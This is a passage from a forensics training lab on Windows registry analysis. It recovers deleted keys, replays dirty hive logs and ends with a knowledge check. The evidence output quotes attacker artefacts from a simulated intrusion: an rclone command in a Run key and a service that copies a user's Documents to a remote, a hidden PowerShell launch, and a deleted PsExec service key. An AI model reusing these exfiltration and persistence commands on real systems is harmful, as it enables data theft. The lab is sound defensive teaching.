    print(f"{r['LastWriteTimestamp'][:19]}  {r['HiveType']:<8} {r['Description']:<15} {r['ValueName'] or '(key)':<15} {r['ValueData'][:58]}")
EOF
```

```
	Key: ControlSet001\Services\OneDriveSync, Value: ImagePath, Data: C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop
	Key: Software\Microsoft\Windows\CurrentVersion\Run, Value: OneDriveUpdate, Data: C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop
Found 2 hits in 2 hives out of 3 files
Found 27 key/value pairs across 3 files
2026-03-02 09:00:00  Software Run (SYSTEM)    SecurityHealth  %windir%\system32\SecurityHealthSystray.exe
2026-09-29 01:04:55  NtUser   TypedPaths      url1            \\203.0.113.50\drop
2026-09-29 01:04:55  NtUser   TypedPaths      url2            C:\Users\alice\AppData\Local\Temp\rc
2026-09-29 01:09:31  NtUser   RunMRU          MRUList         a
2026-09-29 01:09:31  NtUser   RunMRU          a               powershell -w hidden -nop\1
2026-09-29 01:21:30  NtUser   Run (NTUSER)    OneDrive        "C:\Program Files\Microsoft OneDrive\OneDrive.exe" /backgr
2026-09-29 01:21:30  NtUser   Run (NTUSER)    OneDriveUpdate  C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Us
```

27 rows from one command across three hives, ready for Timeline Explorer. Open `work/recmd/kroll.csv` to see the rest (system info including `CurrentBuild` 26100, time zone, ProfileList). Note the batch file labels the SOFTWARE hive's Run key "Run (SYSTEM)"; read the `HiveType` column, not just the description.

### Lab 4: Recover deleted keys and values (15 min)

Nothing in Lab 3 mentioned PsExec, but look again at the Services key:

```bash
recmd -f evidence/WS-ALICE/SYSTEM --kn 'ControlSet001\Services' | grep -E 'Subkey #|Name:'
recmd -f evidence/WS-ALICE/SYSTEM --kn 'ControlSet001\Services\PSEXESVC' | grep -E 'Key path|Last write|ImagePath|Data: %'
rip -r evidence/WS-ALICE/SYSTEM -p del | grep -E 'Key name|Key LastWrite|Value Name'
```

```
	------------ Subkey #0 ------------
	Name: OneDriveSync (Last write: 2026-09-29 01:22:10.5550001) Value count: 6
	------------ Subkey #1 ------------
	Name: W32Time (Last write: 2026-03-02 09:00:00.1234567) Value count: 6
	------------ Subkey #2 (True}) ------------
	Name: PSEXESVC (Last write: 2026-09-29 01:05:12.0731180) Value count: 6
	Key path: ControlSet001\Services\PSEXESVC (Deleted: True)
	Last write time: 2026-09-29 01:05:12.0731180
	Name: ImagePath (RegExpandSz)
	Data: %SystemRoot%\PSEXESVC.exe 
Launching del v.20200515
Key name: PSEXESVC
Key LastWrite time = 2026-09-29 01:05:12Z
Value Name: Type
Value Name: Start
Value Name: ErrorControl
Value Name: ImagePath
Value Name: DisplayName
Value Name: ObjectName
```

A **deleted service key** `PSEXESVC`, last written at 01:05:12. That's the service the Sysinternals **PsExec** tool installs on the target of a remote command and removes afterwards: evidence that someone ran commands on WS-ALICE remotely, three minutes before the PowerShell in RunMRU. (Event logs, Day 14, would show the matching service install: event 7045 in System.evtx.) RECmd re-attached the key to its parent (the `(True})` marker is RECmd's own formatting of "deleted").

Now the user hive:

```bash
rip -r evidence/WS-ALICE/NTUSER.DAT -p del | grep -E -A4 'Value Name: b'
rip -r evidence/WS-ALICE/NTUSER.DAT -p del | grep -E 'c\.m\.d|r\.c\.l|c\.o\.n'
python3 ~/DFIR/scripts/regf_peek.py evidence/WS-ALICE/NTUSER.DAT --deleted | tail -n 2
```

```
Value Name: b
Data Length: 0x0  Data Offset: 0x2e  Data Type: 1088
    1470                          20 00 00 00 76 6b 01 00           ...vk..
    1480  2e 00 00 00 40 04 00 00 01 00 00 00 01 00 00 00  ....@...........
    1490  62 00 00 00 00 00 00 00                          b.......
    1440  38 00 00 00 63 00 6d 00 64 00 20 00 2f 00 63 00  8...c.m.d. ./.c.
    1450  20 00 72 00 63 00 6c 00 6f 00 6e 00 65 00 20 00   .r.c.l.o.n.e. .
    1460  63 00 6f 00 6e 00 66 00 69 00 67 00 5c 00 31 00  c.o.n.f.i.g.\.1.
Keys and values in free cells:
  cell 0x00478  VALUE b [REG_SZ] = cmd /c rclone config\1
```

A RunMRU entry **`b`** was removed from the list (`MRUList` is now just `a`), but its cells survive: the command was `cmd /c rclone config`. Two lessons here:

1. **Read the hex, not only the labels.** In the raw `vk` bytes, `2e 00 00 00` is the data **length** (46 bytes) and `40 04 00 00` is the data **offset** (0x440), and the type is `01` (`REG_SZ`). RegRipper's `del` plugin printed them under the wrong labels (see its troubleshooting entry).
2. **Use a second parser.** RECmd's `--kn` and `--sa` output didn't include this value (try `recmd -f evidence/WS-ALICE/NTUSER.DAT --sa "rclone config"`); RegRipper and `regf_peek.py`, which scan every free cell, did. Different tools recover different things.

### Lab 5: A real dirty hive and its transaction logs (20 min)

These files come from the yarp project's public test data (GPL-3.0), recorded on Windows 10: a hive, its two logs, and the hive Windows itself produced after replaying them.

```bash
cd ~/cases/LAB-011/samples
for f in NewDirtyHive NewDirtyHive.LOG1 NewDirtyHive.LOG2 RecoveredHive_Windows10; do
  curl -sSfL -o "$f" "https://raw.githubusercontent.com/msuhanov/yarp/master/hives_for_tests/NewDirtyHive1/$f"
done
sha256sum NewDirtyHive* RecoveredHive_Windows10 | tee ../notes/samples.sha256
python3 ~/DFIR/scripts/regf_peek.py NewDirtyHive | sed -n '2,4p'
python3 ~/DFIR/scripts/regf_peek.py NewDirtyHive.LOG1 | tail -n 2
python3 ~/DFIR/scripts/regf_peek.py NewDirtyHive.LOG2 | tail -n 4
rip -r NewDirtyHive -d
```

```
1249ab3e9eb0612e83215ab5777d7d57abf6e3eb036917e825c948941b9581f6  NewDirtyHive
c44a21f784217cff1a47448c5f309d39b3640209c7a593f434b53d05368d7c31  NewDirtyHive.LOG1
3be27df83ae3a9b62da2cc3f908c8a9e278c6f95eb659318b71b61a99997d81c  NewDirtyHive.LOG2
3f726f06d800b416a6c9bc857066e47aadb1c3afd296e872fc1b20ca811dcdcf  RecoveredHive_Windows10
Type            : primary hive, format 1, version 1.3
Sequence numbers: primary 3, secondary 2 -> DIRTY (not equal): changes may be in the .LOG1/.LOG2 files
Last written    : 2017-03-04 16:37:31.2216222 UTC
HvLE log entries (each one = a set of dirty pages to write back into the hive):
  offset    512  sequence 2    hive-bins size 20480    dirty pages: 0x0+0x5000
HvLE log entries (each one = a set of dirty pages to write back into the hive):
  offset    512  sequence 3    hive-bins size 20480    dirty pages: 0x0+0x1000
  offset   8192  sequence 4    hive-bins size 20480    dirty pages: 0x0+0x5000
  offset  32768  sequence 5    hive-bins size 20480    dirty pages: 0x0+0x1000
***Hive Check***
The hive (NewDirtyHive) is dirty.

Please consider processing hive transaction logs via either Maxim's yarp + registryFlush.py
or via Eric Zimmerman's rla.exe.

```

Primary 3, secondary 2: Windows started a write it never finished in the hive file. The logs hold entries with sequence numbers 2 to 5. What does the dirty file say, as most tools would read it?

```bash
python3 ~/DFIR/scripts/regf_peek.py NewDirtyHive --tree | tail -n +10 | cut -c1-110
```

```

2017-03-04 20:51:50.2686944  {dedef10d-30ff-45b5-9d44-b3fa249ecd49}
2017-03-04 20:52:03.5030274  {dedef10d-30ff-45b5-9d44-b3fa249ecd49}\Key1
                               (default) [REG_SZ] = 1111111111111111111111111111111111111111111111111111111111
2017-03-04 20:52:19.7530801  {dedef10d-30ff-45b5-9d44-b3fa249ecd49}\Key2
                               v [REG_SZ] = testTEST
2017-03-04 20:52:17.2530727  {dedef10d-30ff-45b5-9d44-b3fa249ecd49}\Key2\Key2_1
2017-03-04 20:52:21.9718162  {dedef10d-30ff-45b5-9d44-b3fa249ecd49}\Key2\Key2_2
```

Now replay the logs with rla and look again:

```bash
rla -f NewDirtyHive --out ../work/replayed | grep -E 'log|Saving'
python3 ~/DFIR/scripts/regf_peek.py ../work/replayed/NewDirtyHive | sed -n '3p'
python3 ~/DFIR/scripts/regf_peek.py ../work/replayed/NewDirtyHive --tree | tail -n +10 | cut -c1-110
diff <(python3 ~/DFIR/scripts/regf_peek.py ../work/replayed/NewDirtyHive --tree | tail -n +10) \
     <(python3 ~/DFIR/scripts/regf_peek.py RecoveredHive_Windows10 --tree | tail -n +10) && echo "rla result = Windows result"
```

```
Two transaction logs found. Determining primary log...
Primary log: ./NewDirtyHive.LOG1, secondary log: ./NewDirtyHive.LOG2
Replaying log file: ./NewDirtyHive.LOG1
Replaying log file: ./NewDirtyHive.LOG2
At least one transaction log was applied. Sequence numbers have been updated to 0x0005. New Checksum: 0xCE22827E
	Saving updated hive to ../work/replayed/NewDirtyHive
Sequence numbers: primary 5, secondary 5 -> CLEAN (equal)

2017-03-04 20:54:05.1123376  {dedef10d-30ff-45b5-9d44-b3fa249ecd49}
2017-03-04 20:55:33.7530678  {dedef10d-30ff-45b5-9d44-b3fa249ecd49}\Key3
                               (default) [REG_SZ] = 1111111111111111111111111111111111111111111111111111111111
2017-03-04 20:53:42.5655030  {dedef10d-30ff-45b5-9d44-b3fa249ecd49}\Key3\Key3_1
2017-03-04 20:53:47.0498744  {dedef10d-30ff-45b5-9d44-b3fa249ecd49}\Key3\Key3_2
2017-03-04 20:55:37.2216912  {dedef10d-30ff-45b5-9d44-b3fa249ecd49}\Key3\Key3_3
rla result = Windows result
```

The difference is the whole point of today:

| | Dirty hive alone | After replaying the logs (= what Windows had) |
|---|---|---|
| `Key1`, `Key2` (and children) | **Present** | Gone: deleted between 20:52 and 20:54 |
| `Key3` (and three children) | **Missing** | Present: created 20:53–20:55 |
| Root key last write | 20:51:50 | 20:54:05 |

An analysis of the dirty file alone would report two keys that no longer existed and miss the one that did, with the most recent three minutes of activity invisible. The replayed tree matches **exactly** what Windows itself recovered. (The deleted `Key1`/`Key2` are still worth looking for in the replayed hive's free cells: `regf_peek.py --deleted`.)

Finally, see how RECmd protects you when the logs are missing:

```bash
mkdir -p ../work/nologs && cp NewDirtyHive ../work/nologs/
recmd -f ../work/nologs/NewDirtyHive --kn '\' 2>&1 | grep -i -E 'dirty|log' | head -n 3
```

```
Command line: -f ../work/nologs/NewDirtyHive --kn \
Processing hive ../work/nologs/NewDirtyHive
Registry hive is dirty and no transaction logs were found in the same directory! LOGs should have same base name as the hive. Aborting!!
```

RECmd refuses rather than giving you a silently stale answer. RegRipper would have parsed it without complaint: that's why `rip -d` belongs at the start of every RegRipper session.

---

## ✅ Knowledge check

1. Which file holds `HKCU` for alice, and which holds her ShellBags?
2. `CurrentControlSet` isn't in the SYSTEM hive file. How do you find which control set to read?
3. A key's last-write time is 01:21:30. What exactly can and can't you conclude about its values?
4. What do the primary and secondary sequence numbers in a hive's base block tell you, and why are collected hives often dirty?
5. Which of RECmd, Registry Explorer and RegRipper replay transaction logs automatically? What do you do for the one that doesn't?
6. Where do deleted keys and values live in a hive, and what eventually destroys them?
7. `ProductName` says "Windows 10 Pro" but the build is 26100. Which Windows is it?
8. Why did RECmd show the deleted `PSEXESVC` key but not the deleted RunMRU value `b`, and what's the practical lesson?
9. What does a deleted `PSEXESVC` service key suggest, and which other artifact would you check to confirm it?

<details>
<summary><b>Answers</b></summary>

1. `C:\Users\alice\NTUSER.DAT` is `HKCU` (mounted as `HKU\<her SID>`). ShellBags live mostly in `C:\Users\alice\AppData\Local\Microsoft\Windows\UsrClass.dat` (`HKU\<SID>_Classes`).
2. Read `SYSTEM\Select\Current`. Its value N means `ControlSet00N` is the one that was current.
3. That something under the key (a value or a subkey) was created, changed or deleted at that time. You can't tell which value, and values have no times of their own. Earlier changes are overwritten by the latest one.
4. Equal numbers mean the last write to the hive completed (clean); different numbers mean it's dirty and recent changes may be only in the `.LOG1`/`.LOG2` files. Windows writes changes to the logs first and flushes the hive lazily, so a hive copied from a running system is often dirty.
5. RECmd and Registry Explorer replay them when the logs are next to the hive. RegRipper doesn't: check with `rip -d` and replay with rla (or yarp) first, then run RegRipper on the clean copy.
6. In **free cells** (positive cell size) that were unlinked from their parent. They survive until the space is reused or Windows reorganises the hive, which discards free cells.
7. Windows 11 (24H2). Windows 11 kept "Windows 10" in `ProductName`; builds 22000 and above are Windows 11.
8. The deleted key's `nk` cell still points to its parent, so RECmd could re-attach and label it. The value `b` was only unlinked from a live key's value list; RECmd's output didn't include it, while RegRipper's `del` and `regf_peek.py`, which scan every free cell, found it. Lesson: run more than one parser on the same evidence, and know what each one looks for.
9. `PSEXESVC` is the service PsExec installs on the remote target and deletes when the command ends, so remote command execution on this machine. Check the System event log for a service-install event (7045) for `PSEXESVC`, and logons (Security 4624, type 3) from the source host; Prefetch for `PSEXESVC.EXE`.

</details>

---

## 📚 Further reading

- Maxim Suhanov, *Windows registry file format specification* (https://github.com/msuhanov/regf): base block, cells, logs and replay rules
- Harlan Carvey, *Windows Registry Forensics* (2nd ed., Syngress, 2016), and the windowsir.blogspot.com article *RegRipper - Handling transaction logs* (2025)
- `Kroll_Batch.md` and `!RECmdBatch.guide` in https://github.com/EricZimmerman/RECmd/tree/master/BatchExamples
- Microsoft Learn: *Registry hives*, and KB article on RegBack changes in Windows 10 version 1803 ("The system registry is no longer backed up to the RegBack folder")
- SANS *Windows Forensic Analysis* poster: registry locations by question

---

## ⏭️ Tomorrow: Day 12

**Evidence of execution: Prefetch, Amcache, Shimcache and BAM/DAM.** Tools: **PECmd**, **AmcacheParser**, **AppCompatCacheParser**.
Today's hives get to work: Shimcache and BAM live in SYSTEM, Amcache is a hive of its own, and together with Prefetch they answer "did this program run, when, and how many times?"

---

<sub>Part of the <a href="../README.md">DFIR Daily</a> series · <a href="../CURRICULUM.md">Full 60-day curriculum</a> · For educational and authorised use only.</sub>
